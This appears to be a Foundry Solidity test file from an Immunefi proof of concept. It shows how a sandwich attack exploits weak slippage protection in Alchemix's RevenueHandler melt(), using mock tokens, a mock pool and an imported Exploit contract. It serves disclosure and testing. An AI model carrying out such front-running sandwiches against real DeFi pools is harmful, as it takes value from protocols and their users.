// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./38184-slippage-protection-is-inaccurate-immunefi-alchemix-git.sol";

contract SandwichMeltTest is Test {
    /// @notice HARM: run() proves an attacker can sandwich RevenueHandler's
    ///         melt() -- profiting in WETH -- while RevenueHandler receives
    ///         less alETH than the pool's fair (unmanipulated) rate would
    ///         have paid, even though the naive minOut check still passes.
    function test_exploit_sandwichProfitsAtRevenueHandlerExpense() public {
        Exploit e = new Exploit();
        e.run();
    }

    /// @notice Isolates the exact mechanism: melting into an UNMANIPULATED
    ///         pool pays MORE alETH than WETH in (matching the finding's
    ///         real-world observation of the WETH/alETH pool rate), but
    ///         after a large front-run swap in the SAME direction as the
    ///         melt, the melt receives measurably less -- while still
    ///         clearing the trivial "amountOut >= amountIn" check.
    function test_buggyMelt_degradedRateStillPassesNaiveCheck() public {
        MockWETH weth = new MockWETH();
        MockAlETH aleth = new MockAlETH();
        Pool pool = new Pool(weth, aleth, 1_000_000 ether, 1_120_000 ether);
        weth.mint(address(pool), 1_000_000 ether);
        aleth.mint(address(pool), 1_120_000 ether);

        RevenueHandler rh = new RevenueHandler(weth, pool);
        weth.mint(address(rh), 1_000 ether);

        uint256 fairDy = pool.getDyWethToAleth(1_000 ether);
        assertGt(fairDy, 1_000 ether, "unmanipulated pool pays more alETH than WETH in");

        // Front-run: a large WETH->alETH swap degrades the rate for the
        // NEXT swap in the same direction.
        weth.mint(address(this), 50_000 ether);
        pool.swapWethToAleth(50_000 ether, 0);

        uint256 degradedDy = rh.melt(); // must NOT revert -- naive check still passes
        assertLt(degradedDy, fairDy, "melt receives less alETH than the fair rate after the front-run");
        assertGe(degradedDy, 1_000 ether, "naive minOut (== inputAmount) still passes despite the degraded rate");
    }

    /// @notice Control: WITHOUT any front-run, RevenueHandler's melt()
    ///         receives (approximately) the pool's fair rate -- isolating
    ///         that the shortfall requires the sandwich, not that melt() is
    ///         broken outright.
    function test_control_noFrontrunMeltsAtFairRate() public {
        MockWETH weth = new MockWETH();
        MockAlETH aleth = new MockAlETH();
        Pool pool = new Pool(weth, aleth, 1_000_000 ether, 1_120_000 ether);
        weth.mint(address(pool), 1_000_000 ether);
        aleth.mint(address(pool), 1_120_000 ether);

        RevenueHandler rh = new RevenueHandler(weth, pool);
        weth.mint(address(rh), 1_000 ether);

        uint256 fairDy = pool.getDyWethToAleth(1_000 ether);
        uint256 actualDy = rh.melt();

        assertEq(actualDy, fairDy, "with no front-run, melt receives exactly the fair (unmanipulated) rate");
        assertGt(actualDy, 1_000 ether, "and it is MORE than the naive 1:1 assumption, not less");
    }
}
